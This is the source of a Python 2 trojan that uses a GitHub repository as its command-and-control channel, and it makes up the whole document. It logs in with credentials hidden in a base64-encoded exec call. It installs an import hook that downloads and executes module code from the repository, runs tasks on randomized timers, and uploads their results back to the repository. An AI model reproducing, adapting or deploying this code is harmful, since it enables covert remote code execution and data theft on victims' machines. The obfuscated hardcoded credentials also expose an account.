#!/usr/bin/python
#-*- coding:utf-8 -*-
import sys
import os
import base64
import json
import time
import imp
import random
import Queue
import threading
from github3 import login

trojan_id = "abc"
trojan_config = "%s.json" % trojan_id
configured = False
data_path = "data/%s/" % trojan_id
trojan_modules = []
task_queue = Queue.Queue()

def connectToGit():
	exec(base64.b64decode("Z2ggPSBsb2dpbih1c2VybmFtZSA9ICJHSFRIWVMiLCBwYXNzd29yZCA9ICJ6ejEzMzE1NTE2NiIp"))
	repo = gh.repository("GHTHYS", "chapter")
	branch = repo.branch("master")
	return gh, repo, branch

def getFileContent(filename):
	gh, repo, branch = connectToGit()
	trees = branch.commit.commit.tree.recurse()
	for filet in trees.tree:
		if filename in filet.path:
			print "[*] Found file %s" % filename
			blob = repo.blob(filet._json_data['sha'])
			return blob.content
	return None

def getConfigJson():
	global configured
	content = getFileContent(trojan_config)
	config = json.loads(base64.b64decode(content))
	configured = True
	for task in config:
		if task['module'] not in sys.modules:
			exec("import %s"%task['module'])
	return config

def moduleDataStore(data):
	gh, repo, branch = connectToGit()
	remote_path = "data/%s/%d.data" % (trojan_id, random.randint(1000,10000))
	repo.create_file(remote_path, "Commit message from %s"%trojan_id, base64.b64encode(data))
	return

class GitImporter(object):
	def __init__(self):
		self.current_module_code = ""
	def find_module(self, fullname, path = None):
		if configured:
			print "[*] Attempting to retrieve %s" % fullname
			content = getFileContent("modules/%s" % fullname)
			if content is not None:
				self.current_module_code = base64.b64decode(content)
				return self
		return None
	def load_module(self, name):
		module = imp.new_module(name)
		exec self.current_module_code in module.__dict__
		sys.modules[name] = module
		return module

def module_runner(module):
	task_queue.put(1)
	result = sys.modules[module].run()
	task_queue.get()
	moduleDataStore(result)
	return
def main():
	while True:
		if task_queue.empty():
			tasks = getConfigJson()
			for task in tasks:
				t = threading.Thread(target = module_runner, args = (task['module'],))
				t.start()
				time.sleep(random.randint(2,10))
		time.sleep(random.randint(1000, 10000))
if __name__ == "__main__":
	sys.meta_path = [GitImporter()]
	main()
